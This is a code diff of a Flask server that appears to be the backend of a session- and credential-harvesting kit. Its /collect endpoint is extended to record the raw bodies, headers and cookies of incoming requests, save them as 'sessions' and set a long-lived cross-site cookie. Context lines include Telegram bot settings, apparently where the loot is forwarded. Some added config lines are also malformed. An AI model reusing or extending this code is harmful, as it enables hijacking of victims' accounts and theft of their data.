@@ -6,6 +6,9 @@ from pathlib import Path
 import jwt
 from functools import wraps
 from typing import List, Dict,Any
+import json
+import uuid
+from urllib.parse import parse_qs
  
 try:
     from dotenv import load_dotenv
@@ -28,6 +31,11 @@ BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
 CHAT_ID   = os.getenv("TG_CHAT_ID")
 ANSWER_FILE = "answer.json"
 app.config.setdefault("sessionid"), requests.session()
+SESSION_COOKIE_HTTPONLY=True,
+SESSION_COOKIE_SAMESITE="None",
+SESSION_COOKIE_SECURE=True,          
+PERMANENT_SESSION_LIFETIME = 31536000
+ 
 
 def send_to_telegram(text: str):
 
@@ -493,16 +501,24 @@ def collect_sessions():
     
 @app.route('/collect', methods=['POST'])
 def collect():
+    raw = request.get_data(as_text=True)
     body = {}
     try:
         if request.is_json:
-            body = request.get_json(silent=True) or {}
+            body = request.get_json(silent=True)
+            
     except Exception:
-        body = {}
-
-    if not body and request.form:
-        body = request.form.to_dict()
-
+        body = {} 
+        
+        qs = parse_qs(raw)
+        if qs:
+            body = {k: (v[0] if len(v) == 1 else v) for k, v in qs.items()}
+    if body is None:
+        body = request.form.to_dict() or {} 
+    print("RAW BODY:", raw)
+    print("PARSED BODY:", body)           
+   
+   
     headers = dict(request.headers)
     cookies = request.cookies.to_dict()
 
@@ -537,8 +553,16 @@ def collect():
     save_sessions(sessions)
 
     print("SESSION:", session_data)
+    resp = make_response(jsonify({
+        "status": "saved",
+        "body": body,
+        "cookies": request.cookies.to_dict()
+    }))
 
-    return jsonify({"status": "saved"})
+    if "sessionid" not in request.cookies:
+        resp.set_cookie("sessionid", str(uuid.uuid4()), httponly=True, samesite="None")
+
+    return resp
 
 @app.route("/submit", methods=["POST"])
 def submit():  
